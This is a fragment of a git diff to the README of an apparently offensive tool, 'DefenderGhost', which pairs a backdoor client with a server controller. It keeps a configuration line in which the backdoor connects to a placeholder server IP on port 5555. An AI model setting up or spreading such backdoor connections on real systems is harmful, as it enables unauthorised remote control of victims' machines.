@@ -52,7 +52,6 @@ The diagram below illustrates the core working of the **DefenderGhost** framewor
 ### 1. 🔧 Configuration
 Before use, update both `backdoor.py` (client) and `server.py` (host controller) with your desired IP address.
 ````markdown
-```python
 # In backdoor.py and server.py
 s.connect(('Your.Server.IP', 5555))
 ````
